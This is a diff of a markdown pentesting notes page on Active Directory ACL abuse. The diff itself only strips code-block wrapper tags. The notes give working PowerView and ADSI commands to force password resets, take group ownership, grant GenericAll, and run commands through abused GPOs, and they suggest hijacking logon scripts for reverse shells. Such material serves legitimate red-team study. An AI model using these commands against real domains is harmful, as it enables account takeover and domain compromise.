@@ -32,11 +32,9 @@ If we have privileges over an object, we can opt to either abuse this ACL or use
 
 With this, we are able to chagne the Script-Path of the logon script of the user. In short, whenever we login to Windows, there is a .bat file or something with a ton of commands in there that are executed. This can be modified, and we could gain a reverse shell everytime a user logs in, for example.
 
-{% code overflow="wrap" %}
 ```powershell
 Get-ObjectAcl -ResolveGUIDs -SamAccountName <user> | ? {$_.IdentityReference -eq "<domain>\<user>"}
 ```
-{% endcode %}
 
 ## WriteProperty on Group
 
@@ -50,7 +48,6 @@ net group "<group name>" <user> /add /domain
 
 With PowerView, we can force a change of another user's password, or we can try to convert the password to a secure string and then be able to change it from there
 
-{% code overflow="wrap" %}
 ```powershell
 Set-DomainUserPassword -Identity <user> -Verbose
 # directly change
@@ -59,20 +56,17 @@ $cred = "password@123!"
 Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString $cred -AsPlainText -Force) -Verbose
 # change password with secure string
 ```
-{% endcode %}
 
 ## WriteOwner on Group
 
 If we have WriteOwner on a Group, then we can simply change the ownership of this group to someone else.
 
-{% code overflow="wrap" %}
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=<group name>,CN=Users,DC=domain,DC=local" -and $_.IdentityReference -eq "domain\user"}
 #find SID of the group
 
 Set-DomainObjectOwner -Identity S-1-5-21... -OwnerIdentity "<user>" -Verbose
 ```
-{% endcode %}
 
 Once we are the owner of the group, we can simply add whoever we want to this group.
 
@@ -80,7 +74,6 @@ Once we are the owner of the group, we can simply add whoever we want to this gr
 
 With these two privileges over a group, we are able to **change our privileges to whatever we want.** Obviously the best is the GenericAll privilege.
 
-{% code overflow="wrap" %}
 ```powershell
 $ADSI = [ADSI]"LDAP://CN=<group>,CN=Users,DC=domain,DC=local"
 
@@ -92,7 +85,6 @@ $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 
 $ADSI.psbase.commitchanges()
 ```
-{% endcode %}
 
 ## Self-Membership
 
@@ -108,7 +100,6 @@ Suppose there are weak permissions over the domain GPOs, and we can edit them. G
 
 These use PowerView, or the SharpGPOAbuse.exe binary.
 
-{% code overflow="wrap" %}
 ```powershell
 # create new GPO task and execute immediately
 New-GPOImmediateTask -TaskName task01 -Command cmd -CommandArguments "/c whoami" -GPODisplayName "Misconfigured Policy" -Verbose -Force
@@ -124,7 +115,6 @@ Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "
 #refreshes and reruns all scripts for GPOs, including malicious ones
 gpupdate /force
 ```
-{% endcode %}
 
 {% embed url="https://github.com/FSecureLABS/SharpGPOAbuse" %}
 
